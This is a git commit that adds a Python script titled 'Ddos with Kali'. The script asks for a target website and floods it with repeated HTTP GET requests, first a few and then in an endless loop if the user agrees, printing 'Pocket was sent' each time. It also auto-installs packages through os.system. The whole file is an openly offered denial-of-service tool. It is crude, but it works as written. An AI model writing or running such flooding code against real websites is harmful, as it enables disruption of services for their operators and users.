3f23f5e6acd6cb6d82b6c2135278f08505db1ffe
MrPersianCoder <51886165+MrPersianCoder@users.noreply.github.com>
2019-06-16 21:30:23 +0430

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,55 @@
+import os
+
+os.system('pip install termcolor && pip install colored && pip install requests && clear')
+import termcolor
+from termcolor import colored
+
+def main():
+
+    print(colored("************************",'blue'))
+    print(colored("*                      *",'blue'))
+    print(colored("*    Ddos with Kali    *",'blue'))
+    print(colored("*                      *",'blue'))
+    print(colored("************************",'blue'))
+
+    print(colored("| made by:  MrPersianCoder(Alireza) |\n", 'green'))
+
+
+main()
+
+import requests
+def dos():
+
+        s = input(colored("enter your target\n example: site.ir\n\n ~> ",'magenta'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("\nPocket was sent",'red'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'blue'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'red'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'blue'))
+
+        c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
+
+        if c == 'y':
+            while True:
+                r = requests.get("http://"+s)
+                print(colored("Pocket was sent", 'red'))
+                r = requests.get("http://"+s)
+                print(colored("Pocket was sent", 'blue'))
+        elif c == 'n':
+            os.system('clear')
+            main()
+            dos()
+
+
+dos()
